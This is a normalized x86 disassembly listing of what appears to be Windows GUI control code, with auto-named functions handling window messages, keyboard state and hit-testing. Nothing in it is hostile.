mov ecx [ eax ]
call [ ecx - 0x14 ]
mov edx [ ebx + 0x8 ]
push edx
mov ecx [ ebx + 0x4 ]
mov edx eax
mov eax esi
call sub_446b24
test [ esi + 0x50 ] 0x80
jne r-xdata
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x14 ]
mov edi [ eax ]
call [ edi + 0xf0 ]
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx ]
sub eax 0x200
je r-xdata
sub eax 0x203
je r-xdata
jmp r-xdata
mov ecx ebx
mov eax [ rw-data ]
mov eax [ eax ]
mov edx esi
call sub_4675f0
jmp r-xdata
dec eax
je r-xdata
sub [ ebx ] 0x2
sub eax 0x3
je r-xdata
cmp [ esi + 0x5d ] 0x1
jne r-xdata
dec eax
je r-xdata
sub eax 0x3
jne r-xdata
or [ esi + 0x54 ] 0x1
jmp r-xdata
mov eax esi
mov si 0xffed
call sub_40358c
jmp r-xdata
and [ esi + 0x54 ] 0xfffe
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebx ]
mov edx [ rw-data ]
cmp eax [ edx + 0x1c ]
jne r-xdata
lea eax [ ebp - 0x114 ]
push eax
call GetKeyboardState
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x114 ]
call sub_45dce0
mov [ ebp - 0xc ] al
mov ax [ ebx + 0x4 ]
mov [ ebp - 0xa ] ax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x10 ]
mov eax esi
mov si 0xffc9
call sub_40358c
jmp r-xdata
sub_448398
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov eax [ ebx ]
sub eax 0xc
je r-xdata
mov eax [ ebx + 0x8 ]
call sub_408e1c
mov edi eax
mov eax [ esi + 0x64 ]
call sub_408e48
mov [ esi + 0x64 ] edi
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx [ ebx ]
mov eax esi
call sub_446b24
dec eax
je r-xdata
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
dec eax
je r-xdata
mov edi r-xdata
mov edi eax
jmp r-xdata
mov edi [ esi + 0x64 ]
test edi edi
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ ebx + 0x4 ]
dec ecx
mov eax [ ebx + 0x8 ]
mov edx edi
call sub_408c74
call sub_408c10
mov [ ebx + 0xc ] eax
jmp r-xdata
mov eax edi
call sub_408c10
mov [ ebx + 0xc ] eax
jmp r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
jmp r-xdata
sub_448440
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov al [ eax + 0x5e ]
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov al [ eax + 0x5e ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp al [ edx + 0x5e ]
setne al
pop ebp
retn
sub_448470
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
push sub_448434
push ebp
call sub_448440
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4484c0
push ebx
mov ebx eax
cmp [ ebx + 0x122 ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
cmp [ ebx + 0x122 ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov eax [ eax + 0x40 ]
cmp eax [ ebx + 0x120 ]
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
mov edx ebx
mov eax [ ebx + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
pop ebx
retn
sub_44854c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
cmp [ eax + 0xd2 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
mov cl [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
sub_448584
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi + 0x51 ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
cmp [ edi + 0x48 ] 0x8000
jg r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_448004
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov ax [ esi + 0x4 ]
call sub_45dc50
mov ecx eax
or cl [ ebp + 0x8 ]
mov edx ebx
mov eax edi
mov si 0xffd5
call sub_40358c
jmp r-xdata
cmp [ edi + 0x4c ] 0x8000
jle r-xdata
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_45dc50
mov ecx eax
or cl [ ebp + 0x8 ]
mov edx ebx
mov eax edi
mov si 0xffd5
call sub_40358c
sub_448608
push ebx
push esi
mov esi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_446af4
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x50 ] 0x8
je r-xdata
mov dl 0x1
mov eax ebx
call sub_4471bc
mov al [ r-xdata ]
push eax
mov edx esi
xor ecx ecx
mov eax ebx
call sub_448584
pop esi
pop ebx
retn
or [ ebx + 0x54 ] 0x2
sub_448654
push ebx
push esi
mov esi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_446af4
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_448670
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_446af4
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x50 ] 0x8
je r-xdata
mov dl 0x1
mov eax ebx
call sub_4471bc
mov al [ r-xdata ]
push eax
mov edx edi
xor ecx ecx
mov eax ebx
call sub_448584
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffe9
call sub_40358c
sub_4486c8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebp ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ edi ]
mov [ esp ] eax
mov eax [ ebp ]
mov [ esp + 0x4 ] eax
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax esi
call sub_447fa4
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
cmp [ esi + 0x5c ] 0x0
je r-xdata
mov bl 0x1
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
call sub_447f38
test al al
je r-xdata
mov eax [ esp + 0x8 ]
mov [ edi ] eax
mov eax [ esp + 0xc ]
mov [ ebp ] eax
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
call sub_447fa4
test al al
jne r-xdata
mov eax [ esp + 0x8 ]
cmp eax [ esp ]
jne r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ esp + 0xc ]
cmp eax [ esp + 0x4 ]
je r-xdata
test bl bl
je r-xdata
sub_448764
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x1
mov eax ebx
call sub_448584
pop esi
pop ebx
retn
sub_448789
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x1
mov eax ebx
call sub_448584
pop esi
pop ebx
retn
sub_4487af
add [ eax ] al
add [ eax ] al
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x2
mov eax ebx
call sub_448584
pop esi
pop ebx
retn
sub_4487d9
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x2
mov eax ebx
call sub_448584
pop esi
pop ebx
retn
sub_4487ff
add [ eax ] al
add [ eax ] al
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] dl
cmp [ eax + 0xda ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x4
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov ebx eax
mov edx eax
mov cl [ ebp - 0x1 ]
mov eax [ ebx + 0xdc ]
call [ ebx + 0xd8 ]
sub_448834
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x51 ] 0x10
jne r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x8000
jg r-xdata
mov edx esp
mov eax ebx
call sub_448004
mov eax [ esp + 0x4 ]
push eax
mov ax [ esi + 0x4 ]
call sub_45dc50
mov edx eax
mov ecx [ esp + 0x4 ]
mov eax ebx
mov si 0xffd4
call sub_40358c
jmp r-xdata
cmp [ ebx + 0x4c ] 0x8000
jle r-xdata
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_45dc50
mov edx eax
movsx ecx [ esi + 0x8 ]
mov eax ebx
mov si 0xffd4
call sub_40358c
sub_4488ac
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
cmp [ eax + 0xe2 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
mov cl [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_4488e4
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi + 0x51 ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
retn
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_45dc50
mov ecx eax
mov edx ebx
mov eax edi
mov si 0xffd3
call sub_40358c
sub_44891c
push ebx
push esi
push edi
add esp 0xffffffe8
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x54 ] 0x2
je r-xdata
xor edx edx
mov eax ebx
call sub_4471bc
mov edx edi
xor ecx ecx
mov eax ebx
call sub_4488e4
add esp 0x18
pop edi
pop esi
pop ebx
retn
and [ ebx + 0x54 ] 0xfffd
mov edx esp
mov eax [ edi + 0x8 ]
call sub_406eec
push [ esp + 0x4 ]
push [ esp + 0x4 ]
lea edx [ esp + 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x10 ]
push eax
call PtInRect
test eax eax
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_40358c
sub_448994
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
mov cl 0x1
mov eax ebx
call sub_4488e4
pop esi
pop ebx
retn
sub_4489b4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
mov cl 0x2
mov eax ebx
call sub_4488e4
pop esi
pop ebx
retn
sub_4489d4
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ rw-data ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov ax [ ebx + 0x4 ]
call sub_45dc50
mov [ ebx + 0x4 ] al
mov edx ebx
mov eax edi
mov si 0xffc9
call sub_40358c
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x20 ] 0x1
mov edx 0x68
mov eax [ rw-data ]
call sub_4520fc
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_448a2c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_4471ac
test al al
je r-xdata
and [ esi + 0x54 ] 0xfffe
xor edx edx
mov eax esi
call sub_4471bc
test [ esi + 0x54 ] 0x1
je r-xdata
pop esi
retn
push 0xffffffff
xor ecx ecx
mov edx 0x202
mov eax esi
call sub_448138
pop esi
retn
sub_448a6c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x74 ]
mov edx [ eax + 0xc ]
test edx edx
jbe r-xdata
mov edx [ eax + 0x14 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x48 ]
jge r-xdata
mov edx [ eax + 0x8 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x48 ]
jle r-xdata
mov edx [ ebx + 0x48 ]
mov [ eax + 0xc ] edx
jmp r-xdata
mov edx [ eax + 0x10 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x4c ]
jge r-xdata
mov edx [ ebx + 0x48 ]
mov [ eax + 0x14 ] edx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
cmp edx [ ebx + 0x4c ]
jle r-xdata
mov edx [ ebx + 0x4c ]
mov [ eax + 0x8 ] edx
jmp r-xdata
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov edx [ ebx + 0x4c ]
mov [ eax + 0x10 ] edx
test [ ebx + 0x55 ] 0x4
jne r-xdata
test [ eax + 0x18 ] 0x1
jne r-xdata
cmp [ eax + 0x10 ] 0x0
je r-xdata
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_44816c
sub_448b1a
add [ eax ] al
test [ eax + 0x1c ] 0x10
je r-xdata
cmp [ eax + 0x57 ] 0x0
je r-xdata
test [ eax + 0x51 ] 0x4
je r-xdata
xor ecx ecx
jmp r-xdata
test [ eax + 0x50 ] 0x40
jne r-xdata
retn
mov dl 0x1
call sub_4473cc
mov cl 0x1
sub_448b5c
push ebx
mov ebx eax
cmp [ ebx + 0x5a ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x70 ]
mov eax ebx
call sub_447124
mov edx [ edx + 0x8 ]
mov eax ebx
call sub_447124
jmp r-xdata
mov [ ebx + 0x5a ] 0x1
sub_448b8c
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x60 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
mov [ ebx + 0x60 ] 0x1
mov dl [ esi + 0x5f ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x70 ]
sub_448bb0
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov edi eax
xor eax eax
mov [ ebx + 0xc ] eax
mov edx esp
mov eax [ ebx + 0x8 ]
call sub_406eec
push esp
movsx ecx [ ebx + 0x6 ]
mov dl [ ebx + 0x4 ]
mov eax edi
mov si 0xffe2
call sub_40358c
test al al
je r-xdata
mov esi [ edi + 0x30 ]
test esi esi
je r-xdata
mov [ ebx + 0xc ] 0x1
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx 0xb043
mov eax esi
call sub_448138
mov [ ebx + 0xc ] eax
sub_448c54
push ebx
mov ebx eax
cmp [ ebx + 0x59 ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x68 ]
mov eax ebx
call sub_447078
mov edx [ edx + 0x8 ]
mov eax ebx
call sub_447078
jmp r-xdata
mov [ ebx + 0x59 ] 0x1
sub_448ce8
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
xor esi esi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
test eax eax
je r-xdata
mov eax esi
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov edi eax
mov eax ebx
call sub_4032d8
cmp edi eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov dl 0x1
call [ eax + 0x2c ]
mov esi eax
mov edx [ esp + 0x4 ]
mov eax esi
call sub_446718
mov edx [ esp ]
mov eax esi
call sub_4466f4
mov edx [ esp + 0x8 ]
sub edx [ esp ]
mov eax esi
call sub_4469a0
mov edx [ esp + 0xc ]
sub edx [ esp + 0x4 ]
mov eax esi
call sub_4469e4
sub_448d6c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
lea ecx [ ebp - 0x10 ]
mov eax [ edi ]
mov edx [ eax + 0x44 ]
mov eax [ edi ]
mov eax [ eax + 0x40 ]
call sub_419ff0
lea edx [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
mov eax [ edi ]
mov eax [ eax + 0x30 ]
call sub_446a9c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
lea ebx [ eax + 0x44 ]
mov eax [ ebx + 0xc ]
sub eax [ ebx + 0x4 ]
mov edx [ edi ]
mov esi [ edx + 0x30 ]
add eax [ esi + 0x4c ]
mov edx [ edi ]
sub eax [ edx + 0x4c ]
push eax
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebx + 0x8 ]
sub ecx [ ebx ]
add ecx [ esi + 0x48 ]
mov eax [ edi ]
sub ecx [ eax + 0x48 ]
mov edx [ esi + 0x44 ]
add edx [ ebx + 0x4 ]
sub edx [ ebp - 0x4 ]
mov eax [ esi + 0x40 ]
add eax [ ebx ]
sub eax [ ebp - 0x8 ]
call sub_41a040
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_446944
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_448df8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
lea edx [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
call sub_448ce8
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ eax + 0x4 ] ebx
mov eax ebx
call sub_44d7a4
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x8 ]
mov [ edx + 0x8 ] eax
push ebp
call sub_448d6c
pop ecx
jmp r-xdata
sub_448e58
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_448f46
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448f4d
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404144
retn
test bl bl
je r-xdata
mov edx [ edi + 0x64 ]
mov eax esi
call sub_446fb4
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_446f84
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov dl [ edi + 0x6a ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
cmp al 0x1
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_446f84
mov eax [ ebp - 0x8 ]
mov edx [ esi + 0x8 ]
call sub_40452c
jne r-xdata
lea eax [ esi + 0x80 ]
mov edx [ edi + 0x7c ]
call sub_404174
cmp [ esi + 0x80 ] 0x0
jne r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x86 ]
mov eax esi
call sub_446ea4
cmp [ esi + 0x57 ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x40 ]
mov [ esi + 0x120 ] eax
mov eax [ edi + 0x44 ]
mov [ esi + 0x124 ] eax
cmp [ esi + 0x122 ] 0x0
jne r-xdata
test bl bl
je r-xdata
sub_448f54
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
cmp esi eax
jne r-xdata
pop esi
pop ebx
retn
xor ecx ecx
mov edx esi
mov eax ebx
mov si 0xffef
call sub_40358c
sub_448f80
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_448fa0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_448fc0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_448fe0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_449000
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_449020
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_449040
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_423ef8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
mov eax ebx
call sub_4465d8
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx eax
mov cl 0x1
mov eax ebx
mov si 0xffef
call sub_40358c
sub_449078
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_449114
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41bd34
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
mov edx eax
mov edi esi
mov eax edi
call sub_4538ec
mov edx [ ebx + 0x80 ]
mov eax edi
call sub_453a24
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_446f84
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_453784
mov dl [ ebx + 0x57 ]
mov eax edi
call sub_453b44
push [ ebx + 0x124 ]
push [ ebx + 0x120 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44911b
lea eax [ ebp - 0x4 ]
call sub_404120
retn
sub_449124
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
xor ebx ebx
mov ecx edx
test ecx ecx
jle r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
mov esi 0x1
mov edx [ ebp - 0x4 ]
add edx 0x8
inc esi
add edx 0x8
dec ecx
jne r-xdata
mov ebx esi
fld [ edx ]
mov eax [ ebp - 0x4 ]
fcomp [ eax + ebx * 8 ]
fnstsw ax
sahf
jae r-xdata
sub_449160
push ebx
push esi
push edi
push ebp
add esp 0xffffffc8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor ebx ebx
mov esi [ eax + 0x48 ]
mov edi [ eax + 0x4c ]
mov eax [ esp ]
test eax eax
jg r-xdata
cmp esi eax
jg r-xdata
mov bl 0x3
jmp r-xdata
mov edx [ esp + 0x4 ]
test edx edx
jg r-xdata
mov bl 0x4
jmp r-xdata
mov eax ebx
add esp 0x38
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edi edx
jg r-xdata
mov bl 0x1
jmp r-xdata
mov ebp edx
sub edi edx
mov [ esp + 0x8 ] eax
sub esi eax
fild [ esp + 0x8 ]
fstp [ esp + 0xc ]
fwait
mov [ esp + 0x2c ] esi
fild [ esp + 0x2c ]
fstp [ esp + 0x14 ]
fwait
mov [ esp + 0x30 ] ebp
fild [ esp + 0x30 ]
fstp [ esp + 0x1c ]
fwait
mov [ esp + 0x34 ] edi
fild [ esp + 0x34 ]
fstp [ esp + 0x24 ]
fwait
lea eax [ esp + 0xc ]
mov edx 0x3
call sub_449124
sub eax 0x1
jb r-xdata
mov bl 0x2
jmp r-xdata
mov bl 0x3
jmp r-xdata
je r-xdata
mov bl 0x4
jmp r-xdata
dec eax
je r-xdata
mov bl 0x1
jmp r-xdata
dec eax
je r-xdata
mov bl 0x2
jmp r-xdata
sub_449210
push ebx
mov ebx eax
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov edx eax
mov eax [ ebx + 0xa0 ]
call sub_40351c
test al al
jne r-xdata
mov al 0x1
pop ebx
retn
sub_449244
push ebx
test [ eax + 0x1c ] 0x1
jne r-xdata
pop ebx
retn
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x4c ]
push edx
mov ecx [ eax + 0x44 ]
mov edx [ eax + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
sub_449264
push ebx
push esi
push edi
mov edi eax
mov ebx edx
mov eax edi
mov si 0xffc8
call sub_40358c
test al al
je r-xdata
mov eax edi
call sub_4492a4
or ebx eax
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax ebx
and eax 0x2
cmp eax 0x2
jne r-xdata
mov eax ebx
and eax 0x1
dec eax
je r-xdata
and ebx 0xfffffffd
jmp r-xdata
or ebx 0x2
sub_4492d0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x8 ]
lea edx [ eax + 0x38 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x78 ]
test al al
jne r-xdata
mov [ edi + 0xc ] 0x1
sub_4492fc
push ebx
push esi
push edi
push ebp
add esp 0xffffffd4
mov ebp edx
mov edi eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
add esp 0x2c
pop ebp
pop edi
pop esi
pop ebx
retn
test [ edi + 0x1c ] 0x10
je r-xdata
mov edx esp
mov eax [ ebp + 0x8 ]
call sub_406eec
mov eax esp
call sub_41a068
test al al
je r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
lea ecx [ esp + 0x8 ]
